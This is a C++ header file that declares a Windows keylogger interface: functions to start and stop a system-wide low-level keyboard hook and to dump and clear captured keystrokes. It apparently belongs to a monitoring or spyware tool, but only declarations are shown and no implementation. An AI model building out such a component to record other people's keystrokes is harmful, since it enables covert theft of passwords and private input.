#pragma once
#include <windows.h>
#include <string>

// Start system-wide low-level keyboard hook (WH_KEYBOARD_LL).
// Creates a dedicated message-loop thread; re-entrant safe (no-op if already running).
void         KeylogStart();

// Stop the hook and join the message-loop thread.
void         KeylogStop();

// Return and clear the buffered keystrokes. Returns L"[empty]" if nothing was captured.
std::wstring KeylogDump();

// True if the hook is currently active.
bool         KeylogRunning();
